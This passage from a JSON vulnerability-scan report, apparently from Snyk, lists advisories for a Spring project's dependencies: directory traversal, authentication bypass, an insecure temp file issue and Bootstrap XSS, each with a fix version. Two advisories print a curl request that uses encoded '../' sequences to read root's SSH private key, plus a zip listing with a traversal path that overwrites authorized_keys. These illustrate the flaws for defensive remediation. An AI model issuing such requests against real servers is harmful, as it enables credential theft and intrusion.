      "description": "## Overview\n[org.springframework:spring-webmvc](https://mvnrepository.com/artifact/org.springframework/spring-webmvc) is a package that provides Model-View-Controller (MVC) architecture and ready components that can be used to develop flexible and loosely coupled web applications.\n\nAffected versions of this package are vulnerable to Directory Traversal. Paths provided to the `ResourceServlet` were not properly sanitized and as a result exposed to directory traversal attacks.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `org.springframework:spring-webmvc` to version 3.2.18.RELEASE, 4.2.9.RELEASE, 4.3.5.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/e2d6e709c3c65a4951eb096843ee75d5200cfcad)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2016-9878)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1408164)\n- [Spring Jira Issue](https://jira.spring.io/browse/SPR-14946)\n",
      "disclosureTime": "2016-12-21T07:29:41Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "3.2.18.RELEASE",
        "4.2.9.RELEASE",
        "4.3.5.RELEASE"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ResourceServlet",
            "filePath": "org/springframework/web/servlet/ResourceServlet.java",
            "functionName": "doInclude"
          },
          "version": [
            "[1.2.1,3.1.4.RELEASE]",
            "[3.2.0.RELEASE,3.2.18.RELEASE)",
            "[4.2.0.RELEASE,4.2.9.RELEASE)",
            "[4.3.0.RELEASE,4.3.5.RELEASE)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.web.servlet.ResourceServlet",
            "functionName": "doInclude"
          },
          "version": [
            "[1.2.1,3.1.4.RELEASE]",
            "[3.2.0.RELEASE,3.2.18.RELEASE)",
            "[4.2.0.RELEASE,4.2.9.RELEASE)",
            "[4.3.0.RELEASE,4.3.5.RELEASE)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-31332",
      "identifiers": {
        "CVE": [
          "CVE-2016-9878"
        ],
        "CWE": [
          "CWE-22"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-webmvc",
        "groupId": "org.springframework"
      },
      "modificationTime": "2020-12-14T14:41:14.559004Z",
      "moduleName": "org.springframework:spring-webmvc",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-webmvc",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-28T07:29:41Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/e2d6e709c3c65a4951eb096843ee75d5200cfcad"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2016-9878"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1408164"
        },
        {
          "title": "Spring Jira Issue",
          "url": "https://jira.spring.io/browse/SPR-14946"
        }
      ],
      "semver": {
        "vulnerable": [
          "[1.2.1,3.2.18.RELEASE)",
          "[4.2.0.RELEASE,4.2.9.RELEASE)",
          "[4.3.0.RELEASE,4.3.5.RELEASE)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Directory Traversal",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-webmvc@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.3.RELEASE",
        "org.springframework:spring-webmvc@4.3.5.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-webmvc",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2018-04-09T10:37:27.442000Z",
      "credit": [
        "Orange Tsai"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\r\n[org.springframework:spring-webmvc](https://mvnrepository.com/artifact/org.springframework/spring-webmvc) Spring provides everything you need beyond the Java language to create enterprise applications in a wide range of scenarios and architectures.\r\n\r\nAffected versions of this package are vulnerable to Directory Traversal. When static resources are served from a file system on Windows (as opposed to the classpath, or the ServletContext), a malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.\r\n\r\n## Details\r\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\r\n\r\nDirectory Traversal vulnerabilities can be generally divided into two types:\r\n\r\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\r\n\r\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\r\n\r\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\r\n\r\n```\r\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\r\n```\r\n**Note** `%2e` is the URL encoded version of `.` (dot).\r\n\r\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \r\n\r\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\r\n\r\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\r\n\r\n```\r\n2018-04-15 22:04:29 .....           19           19  good.txt\r\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\r\n```\r\n\r\n\r\n## Remediation\r\nUpgrade `org.springframework:spring-webmvc` to version 4.3.15, 5.0.5 or higher.\r\n\r\n## References\r\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2018-1271)\r\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-1271)",
      "disclosureTime": "2018-04-06T10:37:27Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "4.3.15.RELEASE",
        "5.0.5.RELEASE"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ResourceHttpRequestHandler",
            "filePath": "org/springframework/web/servlet/resource/ResourceHttpRequestHandler.java",
            "functionName": "isInvalidPath"
          },
          "version": [
            "[4.3.0,4.3.15)",
            "[5.0.0,5.0.5)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.web.servlet.resource.ResourceHttpRequestHandler",
            "functionName": "isInvalidPath"
          },
          "version": [
            "[4.3.0,4.3.15)",
            "[5.0.0,5.0.5)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-32202",
      "identifiers": {
        "CVE": [
          "CVE-2018-1271"
        ],
        "CWE": [
          "CWE-23"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-webmvc",
        "groupId": "org.springframework"
      },
      "modificationTime": "2020-12-14T14:41:09.657627Z",
      "moduleName": "org.springframework:spring-webmvc",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-webmvc",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-04-09T15:17:27Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/91b803a2310344d925e5d4b1709bbcea9037554"
        },
        {
          "title": "NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1271"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2018-1271"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,4.3.15.RELEASE)",
          "[5.0.0.RELEASE,5.0.5.RELEASE)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Directory Traversal",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-webmvc@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.11.RELEASE",
        "org.springframework:spring-webmvc@4.3.15.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-webmvc",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
      "alternativeIds": [],
      "creationTime": "2019-11-29T14:13:10.212986Z",
      "credit": [
        "Clément Notin"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.springframework:spring-webmvc](https://mvnrepository.com/artifact/org.springframework/spring-webmvc) is a package that provides Model-View-Controller (MVC) architecture and ready components that can be used to develop flexible and loosely coupled web applications.\n\nAffected versions of this package are vulnerable to Authentication Bypass. The strictness of the Spring Security and the Spring Framework request mapping may differ, which could lead to resources not being secured.\n## Remediation\nUpgrade `org.springframework:spring-webmvc` to version 4.3.1.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/a30ab30e4e9ae021fdda04e9abfc228476b846b5)\n- [GitHub Commit](https://github.com/spring-projects/spring-security/commit/e4c13e)\n- [GitHub Issue](https://github.com/spring-projects/spring-security/issues/3964)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2016-5007)\n",
      "disclosureTime": "2016-07-11T04:37:38Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "4.3.1.RELEASE"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-536316",
      "identifiers": {
        "CVE": [
          "CVE-2016-5007"
        ],
        "CWE": [
          "CWE-41"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-webmvc",
        "groupId": "org.springframework"
      },
      "modificationTime": "2020-12-14T14:40:52.009995Z",
      "moduleName": "org.springframework:spring-webmvc",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-webmvc",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-07-11T04:37:38Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/a30ab30e4e9ae021fdda04e9abfc228476b846b5"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-security/commit/e4c13e"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-security/issues/3964"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2016-5007"
        }
      ],
      "semver": {
        "vulnerable": [
          "[3.2.0.RELEASE,4.3.1.RELEASE)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Authentication Bypass",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-webmvc@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.0.RELEASE",
        "org.springframework:spring-webmvc@4.3.2.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-webmvc",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-03-31T13:12:18.783639Z",
      "credit": [
        "trungPa",
        "Jonathan Leitschuh"
      ],
      "cvssScore": 7.8,
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Insecure Temporary File via the `org.springframework.boot.web.server.AbstractConfigurableWebServerFactory.createTempDir` method, allowing for temporary directory hijacking and privilege escalation.\n## Remediation\nUpgrade `org.springframework.boot:spring-boot` to version 2.2.11.RELEASE or higher.\n## References\n- [GitHub Fix Commit](https://github.com/spring-projects/spring-boot/commit/667ccdae84822072f9ea1a27ed5c77964c71002d)\n",
      "disclosureTime": "2022-03-31T12:44:50Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.2.11.RELEASE"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORKBOOT-2438287",
      "identifiers": {
        "CVE": [
          "CVE-2022-27772"
        ],
        "CWE": [
          "CWE-377",
          "CWE-379"
        ],
        "GHSA": [
          "GHSA-cm59-pr5q-cw85"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-boot",
        "groupId": "org.springframework.boot"
      },
      "modificationTime": "2022-04-01T10:37:05.693471Z",
      "moduleName": "org.springframework.boot:spring-boot",
      "packageManager": "maven",
      "packageName": "org.springframework.boot:spring-boot",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-31T15:29:45Z",
      "references": [
        {
          "title": "GitHub Fix Commit",
          "url": "https://github.com/spring-projects/spring-boot/commit/667ccdae84822072f9ea1a27ed5c77964c71002d"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.2.11.RELEASE)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Insecure Temporary File",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot@1.3.1.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.2.11.RELEASE",
        "org.springframework.boot:spring-boot-starter@2.2.11.RELEASE",
        "org.springframework.boot:spring-boot@2.2.11.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework.boot:spring-boot",
      "version": "1.3.1.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:11:08.918250Z",
      "credit": [
        "Yonatan Offek (poiu)"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) in` data-template`, `data-content ` and `data-title` properties of tooltip/popover.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.1, 4.3.1 or higher.\n## References\n- [Bootstrap Blog](https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/28236/commits/5efa9b531d25927b907e3fa24b818608bc38a2f0)\n- [GitHub Commit](https://github.com/twbs/bootstrap-rubygem/commit/a63d04c96d14e42492ccdba1d7f3d6ec1af022a9)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/28236)\n- [NPM Security Adviory](https://www.npmjs.com/advisories/891)\n",
      "disclosureTime": "2019-02-11T19:32:59Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "3.4.1",
        "4.3.1"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-451160",
      "identifiers": {
        "CVE": [
          "CVE-2019-8331"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-9v3m-8fp8-mj99"
        ],
        "NSP": [
          "891"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "bootstrap",
        "groupId": "org.webjars"
      },
      "modificationTime": "2020-12-22T17:02:12.908715Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-02-15T19:32:59Z",
      "references": [
        {
          "title": "Bootstrap Blog",
          "url": "https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/28236/commits/5efa9b531d25927b907e3fa24b818608bc38a2f0"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap-rubygem/commit/a63d04c96d14e42492ccdba1d7f3d6ec1af022a9"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/28236"
        },
        {
          "title": "NPM Security Adviory",
          "url": "https://www.npmjs.com/advisories/891"
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 3.4.1)",
          "[4.0.0,4.3.1)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.6"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:13:55.956194Z",
      "credit": [
        "1Jesper1"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `tooltip`, `collapse` and `scrollspy` plugins.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0, 4.1.2 or higher.\n## References\n- [Bootstrap Blog](https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/)\n- [GitHub Commit](https://github.com/twbs/bootstrap/commit/149096016f70fd815540d62c0989fd99cdc809e0)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/26630/commits/3229efc0811df29765c1d0a949c85362378b0628)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/26630/commits/3ba186313e9e651bbd52a6a3a0305891dee0a621)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/26630/commits/efca80bb5bb34546a2e7a9488b89f71457d2ad92)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/26625)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/26627)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/26628)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/27915#issuecomment-452140906)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/26630)\n",
      "disclosureTime": "2018-05-29T21:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "3.4.0",
        "4.1.2"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-451162",
      "identifiers": {
        "CVE": [
          "CVE-2018-14040",
          "CVE-2018-14042"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-7mvr-5x2g-wfc8"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "bootstrap",
        "groupId": "org.webjars"
      },
      "modificationTime": "2021-07-06T14:09:26.251264Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-06-12T08:15:05Z",
      "references": [
        {
          "title": "Bootstrap Blog",
          "url": "https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/commit/149096016f70fd815540d62c0989fd99cdc809e0"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/26630/commits/3229efc0811df29765c1d0a949c85362378b0628"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/26630/commits/3ba186313e9e651bbd52a6a3a0305891dee0a621"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/26630/commits/efca80bb5bb34546a2e7a9488b89f71457d2ad92"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/26625"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/26627"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/26628"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/27915%23issuecomment-452140906"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/26630"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,3.4.0)",
          "[4.0.0 ,4.1.2)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.6"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:15:22.528355Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the tooltip `data-viewport` attribute.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 